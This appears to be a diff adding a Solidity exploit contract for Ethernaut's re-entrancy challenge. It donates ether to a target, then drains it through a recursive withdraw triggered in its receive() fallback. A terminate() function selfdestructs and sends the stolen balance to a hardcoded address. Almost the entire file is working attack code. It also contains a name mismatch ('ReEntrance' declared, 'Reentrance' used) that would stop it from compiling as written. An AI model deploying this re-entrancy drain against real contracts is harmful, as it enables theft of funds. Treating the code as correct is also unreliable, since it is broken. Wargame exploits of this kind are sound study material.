@@ -1,0 +1,56 @@
+pragma solidity ^0.8.0;
+contract ReEntrance {
+
+  function donate(address _to) public payable {}
+  function balanceOf(address _who) public view returns (uint balance) {}
+  function withdraw(uint _amount) public {}
+  receive() external payable {}
+}
+
+contract ReEntranceHack {
+    // the address of our Ethernaut instance
+    address ethernautAddress = 0xf83C8Ac01B9C68AD9C096DDb9ee567422c48067c;
+
+        Reentrance public rehack;
+    constructor() payable {
+        rehack = Reentrance(payable(ethernautAddress));
+    }
+
+    function donate(address receiver) public payable {
+       
+        rehack.donate{value: 1 ether}(receiver);
+    }
+
+    receive() external payable {
+        
+        if (address(ethernautAddress).balance >= 1 ether) {
+           
+            rehack.withdraw(1 ether);
+            
+            // the fallback will be triggered when this contract receives ether from function withdraw() on original contract
+           
+            // it allows the attacker to quickly withdraw more funds than permitted. 
+           
+        }
+    }
+
+    function WithDraw() public {
+        
+        rehack.withdraw(1 ether);
+        
+        // this draws from the original contract and triggers our fallback
+        
+    }
+
+    function getBalance() public view returns (uint) {
+        
+        return address(this).balance;
+        
+        // this will return current balance of exploit contract 
+    }
+
+    function terminate() public {
+        // this will withdraw the funds out of this exploit contract to the address below
+        selfdestruct(payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
+    }
+}
